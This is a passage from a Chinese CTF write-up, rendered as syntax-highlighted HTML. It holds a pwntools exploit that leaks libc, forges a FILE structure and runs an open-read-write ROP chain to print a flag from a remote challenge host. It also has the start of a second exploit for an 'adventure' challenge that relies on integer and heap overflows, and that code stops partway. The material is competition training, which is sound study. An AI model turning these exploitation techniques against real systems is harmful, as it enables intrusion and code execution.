style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD">#io = process(proc, stdin=PIPE, stdout=PIPE)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">8.147.130.84</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91">28680</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#CB7676">def</span><span style="color:#80A665"> choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Choice: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> create</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">size</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">content</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Size: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">size</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Content: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">=</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">26</span><span style="color:#CB7676">+</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">b</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Please input your token: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">ab</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">.</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"leak => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">leak</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc_base</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">leak</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">126</span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">free</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#758575DD">#-0x2db899</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"libc_base => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">sleep</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><br><span style="color:#C99076">_IO_2_1_stdin_</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">_IO_2_1_stdin_</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#C99076">_IO_buf_base</span><span style="color:#666666">=</span><span style="color:#C99076">_IO_2_1_stdin_</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">39</span><br><span style="color:#C99076">_IO_list_all</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">_IO_list_all</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><br><span style="color:#DBD7CAEE">stdout_addr</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">_IO_2_1_stdout_</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">fake_file_start</span><span style="color:#666666">=</span><span style="color:#C99076">_IO_list_all</span><span style="color:#CB7676">-0x</span><span style="color:#4C9A91">500</span><br><span style="color:#DBD7CAEE">sleep</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#C99076">_IO_buf_base</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdout_addr</span><span style="color:#4d9375">)</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">4</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdout_addr</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">210</span><span style="color:#4d9375">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">sleep</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">stdout_addr</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">3</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">stdout_addr</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">210</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">pop_rbp</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">28a91</span><br><span style="color:#DBD7CAEE">magic_gadget</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">176F3E</span><span style="color:#758575DD"> #mov rdx,qword ptr [rax+0x38];mov rdi,rax;call qword ptr [rdx+0x20]</span><br><span style="color:#DBD7CAEE">setcontext</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">setcontext</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">61</span><br><span style="color:#DBD7CAEE">fake_file_struct </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><br><span style="color:#666666">    </span><span style="color:#4d9375">{</span><br><span style="color:#758575DD">        # offset: value # field_name</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">0</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#758575DD">                                             # _flags</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">8</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> pop_rbp</span><span style="color:#666666">,</span><span style="color:#758575DD">                                       # _IO_read_ptr</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">10</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> fake_file_start </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">470</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">,</span><span style="color:#758575DD">                         # _IO_read_end</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">18</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#758575DD">                                    # _IO_read_base</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">20</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#758575DD">                                             # _IO_write_base</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">28</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#758575DD">                                             # _IO_write_ptr</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">38</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> stdout_addr</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">e0</span><span style="color:#CB7676">-0x</span><span style="color:#4C9A91">20</span><span style="color:#666666">,</span><br><span style="color:#758575DD">        # _IO_write_end (0x30) 到 _markers (0x60) 之间未设置的字段将被 flat 自动填充为0</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">68</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> magic_gadget</span><span style="color:#666666">,</span><span style="color:#758575DD">                                    # _chain</span><br><span style="color:#758575DD">        # _fileno (0x70) 到 _shortbuf (0x83) 之间未设置的字段将被 flat 自动填充为0</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">88</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> fake_file_start </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">c30</span><span style="color:#666666">,</span><span style="color:#758575DD">                             # _lock</span><br><span style="color:#758575DD">        # _offset (0x90) 将被 flat 自动填充为0</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">98</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> stdout_addr</span><span style="color:#666666">,</span><span style="color:#758575DD">                                  # _codecvt</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">a0</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> stdout_addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">48</span><span style="color:#666666">,</span><span style="color:#758575DD">                            # _wide_data</span><br><span style="color:#758575DD">        # _freeres_list (0xa8) 到 _unused2 (0xc4) 之间未设置的字段将被 flat 自动填充为0</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">d8</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#d4976c">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">_IO_wfile_jumps</span><span style="color:#C98A7D77">'</span><span style="color:#d4976c">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#758575DD">  # vtable</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><span style="color:#666666">,</span><br><span style="color:#BD976A">    filler</span><span style="color:#666666">=</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">'</span><br><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">pop_rax_ret</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">dd237</span><br><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">10f78b</span><br><span style="color:#DBD7CAEE">pop_rsi_ret</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">110a7d</span><br><span style="color:#DBD7CAEE">syscall</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">45539</span><br><span style="color:#DBD7CAEE">payload2</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">fake_file_struct</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">setcontext</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">a0</span><span style="color:#CB7676">-0x</span><span style="color:#4C9A91">20</span><span style="color:#CB7676">-0x</span><span style="color:#4C9A91">28</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">40</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">flag</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">+</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*</span><span style="color:#4C9A91">4</span><span style="color:#CB7676">+</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">8</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">stdout_addr</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">160</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload2</span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rax_ret</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">257</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">ffffffffffffff9c</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rsi_ret</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">stdout_addr</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">e0</span><span style="color:#CB7676">+0x</span><span style="color:#4C9A91">70</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">syscall</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload2</span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rax_ret</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rsi_ret</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">stdout_addr</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">syscall</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload2</span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rax_ret</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">syscall</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Choice: </span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">payload2</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="adventure" class="scroll-target"><a href="#adventure"><code class="hash inline-code">#</code>adventure</a></h2>
<p>扔给 agent 逆向先，在 sub_1F974 地方似乎有个 0x80 字节的溢出写，购买商品还有整数溢出的漏洞</p>
<p>因此思路如下：</p>
<ul>
<li>利用整数溢出购买全部炸弹</li>
<li>移动到 shadow dragon 的地区，和他开打</li>
<li>用炸弹把他炸死</li>
<li>得到戒指，改名时存在堆上的字符串数组的溢出</li>
<li>在商店页面的卖出商品部分获得泄露的地址</li>
<li>修改戒指的属性，使其还可以调用特别多次</li>
<li>泄露 libc，利用溢出的任意地址读 + 任意地址写，慢慢构建 rop</li>
</ul>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><br><span style="color:#393A34">filename </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">./pwn</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">arch</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">amd64</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">terminal </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">tmux</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">neww</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">local </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">all_logs </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">filename</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">libc</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> local</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">filename</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">else</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">47.94.205.237</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A"> 28709</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> debug</span><span style="color:#2993a3">(</span><span style="color:#393A34">params</span><span style="color:#AB5959">=</span><span style="color:#B5695977">''</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> an_log </span><span style="color:#1E754F">in</span><span style="color:#393A34"> all_logs</span><span style="color:#999999">:</span><br><span style="color:#393A34">        success</span><span style="color:#2993a3">(</span><span style="color:#393A34">an_log</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    pid </span><span style="color:#999999">=</span><span style="color:#393A34"> util</span><span style="color:#999999">.</span><span style="color:#393A34">proc</span><span style="color:#999999">.</span><span style="color:#393A34">pidof</span><span style="color:#2993a3">(</span><span style="color:#393A34">sh</span><span style="color:#2993a3">)</span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">pid</span><span style="color:#999999">,</span><span style="color:#393A34"> params</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    pause</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> leak_info</span><span style="color:#2993a3">(</span><span style="color:#393A34">name</span><span style="color:#999999">,</span><span style="color:#393A34"> addr</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    output_log </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#A65E2B">{}</span><span style="color:#B56959"> => </span><span style="color:#A65E2B">{}</span><span style="color:#B5695977">'</span><span style="color:#999999">.</span><span style="color:#393A34">format</span><span style="color:#2993a3">(</span><span style="color:#393A34">name</span><span style="color:#999999">,</span><span style="color:#998418"> hex</span><span style="color:#1e754f">(</span><span style="color:#393A34">addr</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    all_logs</span><span style="color:#999999">.</span><span style="color:#393A34">append</span><span style="color:#2993a3">(</span><span style="color:#393A34">output_log</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    success</span><span style="color:#2993a3">(</span><span style="color:#393A34">output_log</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> get_name</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Name: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">warrior</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> move_s</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">s</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> move_d</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">d</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> shop</span><span style="color:#2993a3">(</span><span style="color:#393A34">index</span><span style="color:#999999">,</span><span style="color:#393A34"> nums</span><span style="color:#2993a3">)</span><span 